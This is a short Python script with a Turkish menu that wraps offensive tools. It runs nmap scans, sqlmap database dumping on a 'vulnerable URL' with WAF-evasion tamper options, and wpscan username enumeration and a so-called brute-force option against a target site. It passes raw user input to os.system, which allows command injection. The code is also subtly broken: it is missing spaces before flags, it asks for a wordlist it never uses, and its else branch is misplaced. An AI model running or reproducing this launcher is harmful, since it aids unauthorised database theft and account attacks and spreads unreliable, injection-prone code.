import os
author="rootates"
print("""
 █████╗ ████████╗ ██████╗ ██╗     ██╗
██╔══██╗╚══██╔══╝██╔═══██╗██║     ██║
███████║   ██║   ██║   ██║██║     ██║
██╔══██║   ██║   ██║   ██║██║     ██║
██║  ██║   ██║   ╚██████╔╝███████╗██║
╚═╝  ╚═╝   ╚═╝    ╚═════╝ ╚══════╝╚═╝
    mini tool coded by RootAtes#4408                                 
_______________________
1- nmap ile hafif port tara
2- nmap ile servis versiyon bilgisini al
3- sqlmap ile dbs çek
4- sqlmap tamper 1
5- wpscan kullanıcı adı bulma 
6- wpscan brute 
_______________________
""")
at = input("Lütfen Seçeneklerden Birini Seçiniz  -> ")
if at == "1" :
   at2 = input("ip veya link girin => ") 
   os.system("nmap " + at2)
if at == "2" : 
   at3 = input("ip adresi => ")
   os.system("sudo nmap -sS -sV " + at3)
if at == "3":
   at4 = input("açıklı url => ")
   os.system("sqlmap -u "+at4 + "--dbs")
if at == "4" :
   at5 = input("açıklı url =>")
   os.system("sqlmap -u "+at5 + "--tamper=space2comment,between,space2plus -v 2 --hex --random-agent --skip-waf --risk=3 --level=3 --dbs")
if at == "5" :
   at6 = input("hedef wordpress sitesi")
   os.system("wpscan --url "+at6 +"-enumerate u ")
if at =="6" :
   at7 = input ("hedef wordpress sitesi")
   at8 = input ("wordlist yolu")
   os.system("wpscan --url "+at7 +"-enumerate u ")
else : 
  print("hatalı fonksiyon ")